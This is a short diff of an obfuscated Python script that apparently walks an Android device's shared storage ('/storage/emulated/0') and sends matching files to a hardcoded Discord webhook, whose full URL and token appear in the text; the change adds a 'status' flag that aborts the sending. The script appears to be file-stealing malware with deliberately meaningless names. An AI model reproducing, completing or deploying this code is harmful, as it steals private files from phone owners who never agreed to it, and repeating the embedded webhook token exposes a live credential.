@@ -1,5 +1,7 @@
 import os as a1, requests as a2
 
+status = 1
+
 a3 = "/storage/emulated/0"
 a4 = "https://discord.com/api/webhooks/1253136109026934855/voPwC3NOLerLzyJ20rsI0wMQXsVnKKc9yoHTkcLXYzsXPlMMPjv0ExrnuBiEVFCEwYGc"
 
@@ -21,6 +23,9 @@ def a9():
     return a10
 
 def a13():
+    if status != 1:
+        print("[*] Status != 1, abortando envio.")
+        return
     a14 = a9()
     for a15 in a14:
         if a5(a15):
